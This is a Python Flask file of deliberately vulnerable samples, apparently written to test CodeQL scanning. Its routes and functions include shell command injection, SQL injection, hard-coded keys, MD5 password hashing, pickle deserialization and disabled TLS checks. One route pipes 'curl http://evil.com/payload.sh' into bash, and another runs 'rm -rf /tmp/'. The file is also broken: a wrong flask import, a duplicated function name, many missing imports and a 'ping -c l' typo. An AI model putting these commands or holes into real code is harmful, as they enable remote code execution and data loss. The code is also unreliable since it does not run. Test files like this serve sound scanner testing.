import subprocess
from flask import request, flask
app = Flask(__name__)

@app.route("/ping")
def ping():
    target = request.args.get("host", "127.0.0.1")
    # vulnerable: untrusted input passed to shell
    subprocess.check_output(f"ping -c l {target}", shell=True)
    return "OK"

# FIX: avoid shell, pass a list; validate/whitelist target
# subprocess.check_output(["ping", "-c", "l"])

# adding useless code for committing again and test code-ql workflow

@app.route("/hidden-execution")
def hexec():
    # On macOS/Linux: no GUI console, capture output instead
    cmd = "rm -rf /tmp/"
    proc = subprocess.Popen(
        cmd, 
        stdout=subprocess.DEVNULL, 
        stderr=subprocess.DEVNULL
    )
    return "OK"


@app.route("/dangerous-execution")
def dexec():
    os.system("curl http://evil.com/payload.sh | bash") # Dangerous!
    return "OK"


@app.route("/api-key-exposed")
def keyexpose():
    openai_api_key = "SECRET_API_KEY_123"
    return "OK"


@app.route("/sql-injection")
def ping():
    openai_api_key = "some dummy api key"
    return "OK"


# 1) SQL Injection (string concatenation)
def sql_injection_example(user_input: str) -> None:
    # Vulnerable: concatenating user input into SQL
    conn = sqlite3.connect(":memory:")
    cur = conn.cursor()
    cur.execute("CREATE TABLE users(name TEXT)")
    # BAD: user_input interpolated directly
    query = "SELECT * FROM users WHERE name = '%s'" % user_input
    cur.execute(query)  # vulnerable to SQL injection
    conn.close()

# 2) Hard-coded secret / credential
API_KEY = "AKIAEXAMPLESECRETKEY123456"  # Hard-coded secret (detectable)
def hardcoded_secret_example() -> str:
    # pretend to return it somewhere
    return API_KEY

# 3) Weak cryptography usage (MD5)
def weak_crypto_example(password: str) -> str:
    # MD5 is considered weak for password hashing
    h = hashlib.md5()
    h.update(password.encode("utf-8"))
    return h.hexdigest()

# 4) Insecure random for security-sensitive token
def insecure_random_example() -> int:
    # random.random / randint from 'random' is not cryptographically secure
    return random.randint(100000, 999999)  # e.g., OTP generated insecurely

# 5) Command injection via subprocess with shell=True or string concatenation
def command_injection_example(cmd_from_user: str) -> None:
    # Vulnerable: using shell=True with user-provided input
    subprocess.Popen("echo " + cmd_from_user, shell=True)  # command injection

# 6) Path traversal / insecure file access
BASE_DATA_DIR = "/var/data/"
def path_traversal_example(filename: str) -> str:
    # Vulnerable: naive join, attacker may pass ../ to traverse directories
    path = os.path.join(BASE_DATA_DIR, filename)
    with open(path, "r") as f:
        return f.read()

# 7) Insecure deserialization (pickle)
def insecure_deserialization_example(serialized: bytes) -> Any:
    # Vulnerable: untrusted pickle.loads can execute arbitrary code
    obj = pickle.loads(serialized)  # insecure
    return obj

# 8) Disabling SSL certificate verification
def disable_ssl_verification_example(url: str) -> requests.Response:
    # Vulnerable: verify=False disables TLS certificate verification
    resp = requests.get(url, verify=False)  # insecure: susceptible to MITM
    return resp

# 9) Logging sensitive data
def sensitive_logging_example(username: str, password: str) -> None:
    # Vulnerable: logging secrets in cleartext
    logging.warning("User login attempt: user=%s password=%s", username, password)

# 10) Exposing stack trace / information disclosure
def expose_stack_trace_example() -> None:
    try:
        raise ValueError("simulated failure")
    except Exception as ex:
        # Vulnerable: printing full traceback to a response/console
        print("Error occurred:", traceback.format_exc())


# helper main - does NOT call unsafe functions automatically
def main() -> None:
    print("This module contains intentionally insecure code examples for CodeQL testing.")
    print("Add this file to a test branch and let CodeQL run. Do NOT call the functions in production.")
    print("Examples present:")
    print("  1) SQL injection via string concatenation")
    print("  2) Hard-coded secret")
    print("  3) Weak cryptography (MD5)")
    print("  4) Insecure random (Random)")
    print("  5) Command injection (subprocess with shell=True)")
    print("  6) Path traversal (os.path.join with unvalidated filename)")
    print("  7) Insecure deserialization (pickle.loads)")
    print("  8) Disabled SSL verification (requests.get verify=False)")
    print("  9) Sensitive logging (passwords logged)")
    print(" 10) Exposing stack trace (traceback.format_exc)")

if __name__ == "__main__":
    main()
